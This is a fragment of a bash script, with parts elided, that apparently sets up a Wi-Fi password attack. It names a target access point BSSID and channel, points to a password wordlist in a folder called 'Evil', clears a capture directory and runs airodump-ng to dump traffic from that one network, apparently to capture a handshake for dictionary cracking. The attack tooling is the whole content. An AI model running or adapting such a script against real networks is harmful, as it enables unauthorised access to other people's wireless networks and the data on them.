...
BSSID="D4:7B:B0:84:79:C0"
CHANNEL=11
W_FOLDER=/home/dstrok3/disk/Evil/pcap/wifidump/
W_FILE='wifi-dump'
WORDLIST='/home/dstrok3/disk/Evil/wordlists/big.txt'

log_ok 'Creating folders...'
rm -rf ${W_FOLDER}/* &&
mkdir ${W_FOLDER}
...
xterm -bg blue -geometry 93x28+0+0 -T "Dumping..." -e bash -c "airodump-ng -c ${CHANNEL} --bssid ${BSSID} -w ${W_FOLDER}/${W_FILE} wlx00c0ca3ebe53"  &
